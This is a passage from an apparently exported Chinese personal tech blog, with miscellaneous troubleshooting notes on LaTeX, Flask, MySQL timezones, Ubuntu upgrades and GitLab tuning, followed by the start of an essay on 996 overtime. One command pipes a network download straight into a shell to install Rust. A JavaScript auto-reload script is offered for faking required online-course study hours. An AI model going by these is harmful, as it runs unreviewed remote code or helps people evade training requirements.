45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mspace" transform="translate(1420.3, 0)"></g><g data-mml-node="mpadded" transform="translate(1280.3, 0)"><g transform="translate(0, -215.5)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g></g></g></g><g data-mml-node="mspace" transform="translate(2044.3, 0)"></g><g data-mml-node="mi" transform="translate(1929.3, 0)"><path data-c="1D44B" d="M42 0H40Q26 0 26 11Q26 15 29 27Q33 41 36 43T55 46Q141 49 190 98Q200 108 306 224T411 342Q302 620 297 625Q288 636 234 637H206Q200 643 200 645T202 664Q206 677 212 683H226Q260 681 347 681Q380 681 408 681T453 682T473 682Q490 682 490 671Q490 670 488 658Q484 643 481 640T465 637Q434 634 411 620L488 426L541 485Q646 598 646 610Q646 628 622 635Q617 635 609 637Q594 637 594 648Q594 650 596 664Q600 677 606 683H618Q619 683 643 683T697 681T738 680Q828 680 837 683H845Q852 676 852 672Q850 647 840 637H824Q790 636 763 628T722 611T698 593L687 584Q687 585 592 480L505 384Q505 383 536 304T601 142T638 56Q648 47 699 46Q734 46 734 37Q734 35 732 23Q728 7 725 4T711 1Q708 1 678 1T589 2Q528 2 496 2T461 1Q444 1 444 10Q444 11 446 25Q448 35 450 39T455 44T464 46T480 47T506 54Q523 62 523 64Q522 64 476 181L429 299Q241 95 236 84Q232 76 232 72Q232 53 261 47Q262 47 267 47T273 46Q276 46 277 46T280 45T283 42T284 35Q284 26 282 19Q279 6 276 4T261 1Q258 1 243 1T201 2T142 2Q64 2 42 0Z"></path></g></g></g></svg></mjx-container></span>的字符不能像UnicodeMath一样打空格实时预览，需要按<code>Ctrl + =</code>预览（切换到专业模式），按<code>Ctrl + Shift + =</code>将公式重置为线性格式。（其实我感觉UnicodeMath的输入方式比LaTeX简单方便多了，建议不是非要用LaTeX的直接用word默认的那个就好了）</p>
<p>要在公式块之外打字符（比如输入，在选项里面打开“在公式区以外使用‘数学自动更正’规则”就行了） 参考：<span class="exturl" data-url="aHR0cHM6Ly9zdXBwb3J0Lm9mZmljZS5jb20vemgtY24vYXJ0aWNsZS93b3JkLeS4reS9v+eUqC11bmljb2RlbWF0aC3lkowtbGF0ZXgt55qE57q/5oCn5qC85byP5YWs5byPLTJlMDA2MThkLWIxZmQtNDlkOC04Y2I0LThkMTdmMjU3NTRmOA==">Word 中使用 UnicodeMath 和 LaTeX 的线性格式公式<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="markdown">Markdown</h2>
<p>图片超链接: 把图片的markdown放到链接的<code>[]</code>里就行了</p>
<pre><code>[![]()]()</code></pre>
<p>主副标题</p>
<pre class="line-numbers language-none"><code class="language-none">主标题
====
副标题
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="flask报错requests.exceptions.sslerror">Flask报错requests.exceptions.SSLError</h2>
<p>之前还是好的，今天就报这个错。但我也没用https或者配置SSL证书，临时将verify关了，好了。 但是应该verify也不会有问题，将代理关掉之后正常了，是代理冲突的问题</p>
<h2 id="flask注册登录有延迟">Flask注册登录有延迟</h2>
<p>之前师兄写的一个数据标注的Flask小网页，拿到之后注册后数据库里有用户名和密码，但是登录就显示未注册，之前注册的是可以的。等了很久之后，用户账号能用了，延迟了几分钟。有的时候等了几个小时也不行，重启也不行，很迷。</p>
<p>发现MySQL和Docker的时间不对，差了8个小时，怀疑是时区的问题 使用<code>date -R</code>发现Ubuntu服务器的时间对的，MySQL和Docker时间不对</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; set global time_zone = '+8:00';
mysql&gt; select now();
mysql&gt; SELECT @@global.time_zone, @@session.time_zone;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>结果还是MySQL时间不对，但是时区显示是+8:00 重启又试了一下<code>SET GLOBAL time_zone = 'Asia/Shanghai';</code></p>
<p>给Docker同步时间，先用<code>Docker exec -it &lt;container id&gt;</code>进入容器，再查看时间，发现Docker时间也差了8小时</p>
<p>修改时间：<code>docker cp /etc/localtime &lt;container id&gt;:/etc/localtime</code></p>
<p>把时区都调成一致之后还是有问题。</p>
<p>这个先等一下，有空再看看师兄的源码，好像还是前后端分离的，有点麻烦。师兄们也不知道是哪的问题，之前都是好的。而且放在教研室服务器一段时间之后也会登录不了，需要重启，不知道是哪的问题。这个坑等有空了再看看。</p>
<h2 id="linux查看本地ip">Linux查看本地IP</h2>
<p>ip addr show</p>
<h2 id="退出-git-log">退出 git log</h2>
<p>按q就好了</p>
<h2 id="文献管理">文献管理</h2>
<p>学校不给买Endnote，只好zotero了。（据说本来是要采购，钱都打过去了那边说你电涉军禁运不给卖又给退了） （你别说，开源的zotero用了几天还挺香）</p>
<h2 id="用css给markdown标题自动编号">用CSS给Markdown标题自动编号</h2>
<p>今天看师兄们写的Markdown文档，发现他们居然在手动打编号 搜了一下，可以拿CSS搞定自动编号，<span class="exturl" data-url="aHR0cHM6Ly9zdXBwb3J0LnR5cG9yYS5pby9BdXRvLU51bWJlcmluZy8=">https://support.typora.io/Auto-Numbering/<i class="fa fa-external-link-alt"></i></span> 找到一个更好的<span class="exturl" data-url="aHR0cHM6Ly95YW53ZWkuZ2l0aHViLmlvL21pc2MvbWFya2Rvd24tYXV0by1udW1iZXItdGl0bGUuaHRtbA==">https://yanwei.github.io/misc/markdown-auto-number-title.html<i class="fa fa-external-link-alt"></i></span> 加这段代码</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">&lt;style type="text/css"&gt;
    h1</span> <span class="token punctuation">{</span> <span class="token property">counter-reset</span><span class="token punctuation">:</span> h2counter<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token selector">h2</span> <span class="token punctuation">{</span> <span class="token property">counter-reset</span><span class="token punctuation">:</span> h3counter<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token selector">h3</span> <span class="token punctuation">{</span> <span class="token property">counter-reset</span><span class="token punctuation">:</span> h4counter<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token selector">h4</span> <span class="token punctuation">{</span> <span class="token property">counter-reset</span><span class="token punctuation">:</span> h5counter<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token selector">h5</span> <span class="token punctuation">{</span> <span class="token property">counter-reset</span><span class="token punctuation">:</span> h6counter<span class="token punctuation">;</span> <span class="token punctuation">}</span>
    <span class="token selector">h6</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
    <span class="token selector">h2:before</span> <span class="token punctuation">{</span>
      <span class="token property">counter-increment</span><span class="token punctuation">:</span> h2counter<span class="token punctuation">;</span>
      <span class="token property">content</span><span class="token punctuation">:</span> <span class="token function">counter</span><span class="token punctuation">(</span>h2counter<span class="token punctuation">)</span> <span class="token string">".\0000a0\0000a0"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector">h3:before</span> <span class="token punctuation">{</span>
      <span class="token property">counter-increment</span><span class="token punctuation">:</span> h3counter<span class="token punctuation">;</span>
      <span class="token property">content</span><span class="token punctuation">:</span> <span class="token function">counter</span><span class="token punctuation">(</span>h2counter<span class="token punctuation">)</span> <span class="token string">"."</span>
                <span class="token function">counter</span><span class="token punctuation">(</span>h3counter<span class="token punctuation">)</span> <span class="token string">".\0000a0\0000a0"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector">h4:before</span> <span class="token punctuation">{</span>
      <span class="token property">counter-increment</span><span class="token punctuation">:</span> h4counter<span class="token punctuation">;</span>
      <span class="token property">content</span><span class="token punctuation">:</span> <span class="token function">counter</span><span class="token punctuation">(</span>h2counter<span class="token punctuation">)</span> <span class="token string">"."</span>
                <span class="token function">counter</span><span class="token punctuation">(</span>h3counter<span class="token punctuation">)</span> <span class="token string">"."</span>
                <span class="token function">counter</span><span class="token punctuation">(</span>h4counter<span class="token punctuation">)</span> <span class="token string">".\0000a0\0000a0"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector">h5:before</span> <span class="token punctuation">{</span>
      <span class="token property">counter-increment</span><span class="token punctuation">:</span> h5counter<span class="token punctuation">;</span>
      <span class="token property">content</span><span class="token punctuation">:</span> <span class="token function">counter</span><span class="token punctuation">(</span>h2counter<span class="token punctuation">)</span> <span class="token string">"."</span>
                <span class="token function">counter</span><span class="token punctuation">(</span>h3counter<span class="token punctuation">)</span> <span class="token string">"."</span>
                <span class="token function">counter</span><span class="token punctuation">(</span>h4counter<span class="token punctuation">)</span> <span class="token string">"."</span>
                <span class="token function">counter</span><span class="token punctuation">(</span>h5counter<span class="token punctuation">)</span> <span class="token string">".\0000a0\0000a0"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token selector">h6:before</span> <span class="token punctuation">{</span>
      <span class="token property">counter-increment</span><span class="token punctuation">:</span> h6counter<span class="token punctuation">;</span>
      <span class="token property">content</span><span class="token punctuation">:</span> <span class="token function">counter</span><span class="token punctuation">(</span>h2counter<span class="token punctuation">)</span> <span class="token string">"."</span>
                <span class="token function">counter</span><span class="token punctuation">(</span>h3counter<span class="token punctuation">)</span> <span class="token string">"."</span>
                <span class="token function">counter</span><span class="token punctuation">(</span>h4counter<span class="token punctuation">)</span> <span class="token string">"."</span>
                <span class="token function">counter</span><span class="token punctuation">(</span>h5counter<span class="token punctuation">)</span> <span class="token string">"."</span>
                <span class="token function">counter</span><span class="token punctuation">(</span>h6counter<span class="token punctuation">)</span> <span class="token string">".\0000a0\0000a0"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
&lt;/style&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者用CSS文件外部引用</p>
<h2 id="linux终端用户名和主机高亮">Linux终端用户名和主机高亮</h2>
<p>MobaXterm里面的终端经常找丢位置，决定搞点高亮 设置参考这里<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81MTAwODA4Nw==">https://zhuanlan.zhihu.com/p/51008087<i class="fa fa-external-link-alt"></i></span>，如果只是用户名高亮的话改改.bashrc就行了</p>
<h2 id="ubuntu16.04lts-强行升级">Ubuntu16.04LTS 强行升级</h2>
<p>准备作大死来个滚动升级, 对，就是教研室那个服务器。滚过manjaro的我遇到什么背锅也不会怕，奥利给</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> upgrade <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> autoremove<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后换源，把apt的镜像源从16.04LTS换到18.04LTS 直接<code>sudo do-release-upgrade -d</code>报错</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Upgrades to the development release are only available from the latest supported release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>看到说要改一下，把那个<code>/etc/update-manager/release-upgrades</code>下的<code>Prompt=never</code>换成LTS或者normal（升完再换LTS）</p>
<p>然后<code>sudo apt upgrade</code>报这种错</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">The following packages have unmet dependencies:
 perl-modules-5.22 : Conflicts: perl-modules
                     Conflicts: perl-modules:i386
E: Broken packages<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>也不知道谁装的perl，package 还坏了 卸掉，再次试图upgrade，漫长的等待...妈耶，停在99%了<br>
行了，吓死我了<br>
成功滚成18.4，能apt装neofetch了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ununtu-server-update.png" alt="Picture" style="zoom:80%;"></p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">root@labserver:~# neofetch
            .-/+oossssoo+/-.               root@labserver
        `:+ssssssssssssssssss+:`           --------------
      -+ssssssssssssssssssyyssss+-         OS: Ubuntu 18.04.3 LTS x86_64
    .ossssssssssssssssssdMMMNysssso.       Host: PowerEdge R730xd
   /ssssssssssshdmmNNmmyNMMMMhssssss/      Kernel: 4.12.14-041214-generic
  +ssssssssshmydMMMMMMMNddddyssssssss+     Uptime: 3 days, 14 hours, 3 mins
 /sssssssshNMMMyhhyyyyhmNMMMNhssssssss/    Packages: 897
.ssssssssdMMMNhsssssssssshNMMMdssssssss.   Shell: bash 4.4.20
+sssshhhyNMMNyssssssssssssyNMMMysssssss+   Theme: Ambiance [GTK3]
ossyNMMMNyMMhsssssssssssssshmmmhssssssso   Icons: Ubuntu-mono-dark [GTK3]
ossyNMMMNyMMhsssssssssssssshmmmhssssssso   Terminal: /dev/pts/0
+sssshhhyNMMNyssssssssssssyNMMMysssssss+   CPU: Intel Xeon E5-2630 v4 (20) @ 3.100GHz
.ssssssssdMMMNhsssssssssshNMMMdssssssss.   GPU: Matrox Electronics Systems Ltd. G200eR2
 /sssssssshNMMMyhhyyyyhdNMMMNhssssssss/    Memory: 529MiB / 32074MiB
  +sssssssssdmydMMMMMMMMddddyssssssss+
   /ssssssssssshdmNNNNmyNMMMMhssssss/
    .ossssssssssssssssssdMMMNysssso.
      -+sssssssssssssssssyyyssss+-
        `:+ssssssssssssssssss+:`
            .-/+oossssoo+/-.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ubuntu-server.png" alt="Picture" style="zoom:80%;"></p>
<p>然后是清理遗留包, 用<code>sudo apt autoremove</code>把下面几个没用的包全清了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">The following packages were automatically installed and are no longer required:
  g++-5 libbind9-140 libblas-common libboost-filesystem1.58.0 libboost-filesystem1.65.1 libboost-system1.58.0 libboost-system1.65.1 libcapnp-0.5.3 libcapnp-0.6.1 libdbus-glib-1-2 libdns162 libefivar0
  libegl-mesa0 libegl1 libegl1-mesa libgbm1 libgdbm3 libgl1-mesa-glx libicu55 libisc160 libisccc140 libisccfg140 libllvm6.0 liblwres141 libmirclient9 libmircommon7 libmircore1 libmirprotobuf3
  libprotobuf-lite10 libprotobuf-lite9v5 libpython3.5-dev librpm3 librpmbuild3 librpmio3 librpmsign3 libstdc++-5-dev libtxc-dxtn-s2tc0 libunistring0 libvpx3 libwayland-egl1-mesa libwayland-server0
  libxcb-xfixes0 libxfont1 lua-lpeg python3.5-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后是略有风险的</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> dist-upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>暂时还没有报错</p>
<h2 id="powershell查看监听端口">Powershell查看监听端口</h2>
<p>之前在网上查的查看监听端口命令是</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">netstat <span class="token operator">-</span>an <span class="token punctuation">|</span> find <span class="token string">"LISTEN"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>发现只能在cmd下用，powershell 提示<code>FIND: 参数格式不正确</code>, 查了一下是find会转义""的问题, 改成</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">netstat <span class="token operator">-</span>an <span class="token punctuation">|</span> find <span class="token operator">--</span><span class="token operator">%</span> <span class="token string">"LISTENING"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="安装onefetch">安装onefetch</h2>
<p>这是一个查看git仓库信息的命令行工具，跟neofetch差不多，snap就可以装</p>
<p>这个使用rust写的，编译安装需要rustc，可以直接安装一下rustc</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> --proto <span class="token string">'=https'</span> --tlsv1.2 -sSf https://sh.rustup.rs <span class="token operator">|</span> <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者apt安装，只要<code>rustc --version</code>显示不小于1.3.6就行了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/o2sh/onefetch.git
<span class="token builtin class-name">cd</span> onefetch
<span class="token function">make</span> <span class="token function">install</span>
<span class="token function">sudo</span> <span class="token function">cp</span> target/release/onefetch /usr/local/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后切进仓库输入<code>onefetch</code>就行了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/onefetch.png" alt="Picture" style="zoom:80%;"></p>
<h2 id="git仓库更改权限不用每次sudo">Git仓库更改权限不用每次sudo</h2>
<p>发现.git的默认权限是root用户的</p>
<p>只要切进仓库里面把文件夹的权限改了就行了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chown</span> -R username:username .git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="安全与环保知识网络教育及考试">安全与环保知识网络教育及考试</h2>
<p>行吧,你电啥有用的也不教,就整这些破玩意, 里面还有什么中医治烫伤。。。还都是13年的, 还要刷够120小时学习时间。这破网站还没有域名没HTTPs，右上角一个大大的不安全，滑稽。 <img width="600" src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/jb.png" alt="Picture"> 并没有任何反爬措施，试了一下，是5分钟断线自动下线，整个自动刷新就好了</p>
<p>我做题的时候搜答案又看了一下，很多个学校都有这个，而且界面和内容完全一致，应该都能通用</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">timeout <span class="token operator">=</span> <span class="token number">200</span>
count<span class="token operator">=</span><span class="token number">0</span>
current<span class="token operator">=</span>location<span class="token punctuation">.</span>href<span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>timeout<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">'reload()'</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token operator">*</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">else</span>
location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">'reload()'</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token operator">*</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span>
count<span class="token operator">++</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'每（'</span><span class="token operator">+</span>timeout<span class="token operator">+</span><span class="token string">'）秒自动新,刷新次数：'</span><span class="token operator">+</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
fr4me<span class="token operator">=</span><span class="token string">'&lt;frameset cols=\'*\'&gt;\n&lt;framesrc=\''</span><span class="token operator">+</span>current<span class="token operator">+</span><span class="token string">'\'/&gt;'</span><span class="token punctuation">;</span>
fr4me<span class="token operator">+=</span><span class="token string">'&lt;/frameset&gt;'</span><span class="token punctuation">;</span>
<span class="token keyword">with</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">write</span><span class="token punctuation">(</span>fr4me<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">voi</span><span class="token punctuation">(</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="win10">Win10</h2>
<p>禁用快速启动（感觉禁了这玩意能少一般的咖喱味）</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powercfg <span class="token operator">/</span>h off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>禁用小娜进程，禁了能少三分之一的CPU跑满100%糟心事</p>
<p>另外不要乱试瘟10全新咖喱味BUG体验计划，加入之后一不小心就退不回去了，只有重装大法了。</p>
<p>我为了尝试20H1的wsl2，冒死试了一下，结果绿屏了，重启N次之后终于好了，结果发现显示有问题，屏幕经常一堆蓝线蓝点，然后UWP版QQ打不开了。CPU 100% 风扇狂转（这貌似是1909就有的问题）</p>
<p>瘟10更新可比Arch滚动难受多了.....</p>
<p>突然发现你电给的正版激活工具还能激活企业版（之前一直以为只能激活学校官网给的那个咖喱味的专业版,唉，之前看到河畔上还有老哥卸了学校的专业版整个盗版LTSB），那就没那么多事了，直接搞个win10 LTSB.</p>
<h2 id="gitlab占用过高">Gitlab占用过高</h2>
<p>看了一下发现Gitlab的默认配置，开了很多进程，默认基本跑满了一半内存。 修改配置文件<code>/etc/gitlab/gitlab.rb</code>如下</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">unicorn['worker_processes'] = 2 # 改进程数为最小的2
unicorn['worker_timeout'] = 60  # 无响应断开
postgresql['shared_buffers'] = "64MB"  # 数据库缓存，默认是1/4RAM,用不着，改小
postgresql['max_worker_processes'] = 2 # 数据库并发数，也改成2
prometheus_monitoring['enable'] = false # 关闭prometheus(一个报警监控，用不着)，这个吃内存也很厉害
sidekiq['concurrency'] = 2  # 好像是一个异步的钩子，把并发改成2
unicorn['worker_memory_limit_min'] = "100 * 1 &lt;&lt; 20" # 好像是监测内存泄露的配置，见unicorn-worker-killer
unicorn['worker_memory_limit_max'] = "250 * 1 &lt;&lt; 20"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里面最高的是哪个prometheus监控程序,CPU占用565.1%多（20核，1核算100%） &gt;veth6901d37 0b 0b 569.4 0.3 1.44G 98.7M 85885 gitlab-pr 0:53 29 0 S 0 0 /opt/gitlab/embedded/bin/prometheus --web.listen-address=localhost:9090 --storage.tsdb.path=/var/opt/gitl</p>
<p>然后让配置生效，等一分钟</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gitlab-ctl reconfigure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这样CPU占用就不到10%了</p>
<p>顺便把gitlab-ce的源换了</p>
<blockquote>
<p>/etc/apt/sources.list.d/gitlab_gitlab-ce.list # 按照清华镜像源的说明是gitlab-ce.list</p>
</blockquote>
<h2 id="ubuntu从18.10降级为18.04">Ubuntu从18.10降级为18.04</h2>
<p>这两天上vultr小鸡上看了看，突然发现18.10停止维护了，懒得升级19.10了，直接换回18.04LTS版本吧</p>
<blockquote>
<p>E: The repository 'http://archive.ubuntu.com/ubuntu cosmic Release' no longer has a Release file.</p>
</blockquote>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9saW51eGNvbmZpZy5vcmcvaG93LXRvLWRvd25ncmFkZS11YnVudHUtbGludXgtc3lzdGVtLXRvLWl0cy1wcmV2aW91cy12ZXJzaW9u">How to downgrade Ubuntu Linux system to its previous version<i class="fa fa-external-link-alt"></i></span></p>
<p>先把源换了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">sed</span> -i <span class="token string">'s/cosmic/bionic/g'</span> /etc/apt/sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后处理一下已经安装的软件，编辑<code>/etc/apt/preferences</code>，保留原来的版本</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Package: *
Pin: release <span class="token assign-left variable">a</span><span class="token operator">=</span>bionic
Pin-Priority: <span class="token number">1001</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后再<code>sudo apt update &amp;&amp; apt upgrade</code>就好了</p>
<h2 id="乱码">乱码</h2>
<p>两次看到这个乱码<code>ï»¿</code>有一次json在开头出现乱码 一次是转码的问题（latin1格式拿utf-8打开并保存出了问题），还有一次是头文件的问题</p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>bug</tag>
        <tag>LaTeX</tag>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>轻关易道，通商宽衣</title>
    <url>/25d3/</url>
    <content><![CDATA[<p>to be continued <a id="more"></a></p>
<h2 id="文化又迈进了一大步">文化又迈进了一大步</h2>
<p>明天就要考猫（包）概了，祝我挂科</p>
<p><img width=250 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/baobao.jpg" alt="picture"/> <!-- 
---

## 始有澄清之志

附上课程小报告（~~我瞎写的~~由于不符合本课~~24小时中国梦的~~要求，这一篇写得非常含蓄）,略有改动，

<center><font face="黑体" size=4>互联网公司加班情况调研报告</font></center>  
<br>

【摘要】  最近996.icu活动引起了人们对于996加班方式的关注和讨论。本文主要介绍以互联网公司为代表的企业加班情况及对于该现状的讨论。 目前中国许多企业都鼓励加班，不少企业更是出于利益原因公然违反劳动法，压榨剥削员工。这种做法不仅影响员工身体健康，而且不利于企业的长期发展和技术积累，为了追求短期利益造成了社会问题。

关键词： 劳动法；996；互联网；加班

### icu 事件概况

近日，996.icu活动在最大的代码托管网站兴起。这个活动由v2ex论坛用户 @nulun 发起，当时他在996的帖子下回复时表示他所在的公司最近开始996自己感觉顾不上身体和家庭并建立了这个网站。该网站 没想到该活动在几天之内获得巨大反响，两天之内该项目仓库的star突破一万，许多人在该项目的issue里留言讨论。引起了国内外媒体的注意。一周之后超过Github上Linux kernel等知名项目，成为Github上star数目第二的项目。在项目star数目超过10万时，该项目的issue被关闭。

起初该网站只是列举了近日违反劳动法的有赞、京东和58等公司的行为以及劳动法的具体内容。随着github项目受到关注，主要的讨论和声援活动转移到了GitHub的issue和pull request里，其他相关的Github仓库（如提倡不加班和介绍不加班公司和岗位955.WLB项目）也开始建立并活跃起来。各公司员工纷纷曝光所在公司的加班情况，并发起了投票和统计活动。针对996公司的开源许可协议也由提议到宾夕法尼亚大学和伊利诺伊大学的法学人士起草并成型（ [Anti-996-License-1.0](https://github.com/kattgu7/996-License-Draft)），其他周边活动也活跃了起来，QQ和telegram建立起相关的群组，各大论坛和网站也开始讨论这一事件。该项目也被翻译成了英语、法语、德语等十几种语言。投票选出的几千家公司[996 公司黑名单](https://github.com/fengT-T/996_list) 和  [955 公司白名单](https://github.com/formulahendry/955.WLB) 也被整理出来。几乎所有的国内大公司都存在违反劳动法的加班情况，而９５５名单上的公司多为外企，国内公司寥寥无几。

该项目在出人意料地获得大量响应之后引来了国内外的关注和报道，python之父 Guido van Rossom 在社交媒体推特上声称996 工作制是不人道的，并且在GitHub上star了 996.icu 项目。他随后还在python社区发布了问题：&quot;Can we do something for 996 programmers in china? &quot; Guido表示：&quot;一个星期前一些中国程序员创建了996.icu抱怨恶劣的工作条件——现在该网站已经被各种中国浏览器禁止访问了——我针对此事发布了推文，现在我的推特已经充满了关于这个问题的讨论。&quot; Python 社区甚至开始探讨禁止实行996工作制的公司使用python的可能性。

在该项目引发大量关注之后，微博、知乎以及国外的Reddit论坛等网站也开始讨论，随后《中国青年报》、《南方日报》等媒体也开始报道。该项目也成为了硅谷流行科技新闻网站 TechMeme 4 月 4 日首页要闻。BBC等国外媒体。几天后，人民日报和共青团中央等官媒对996和加班做出点评。

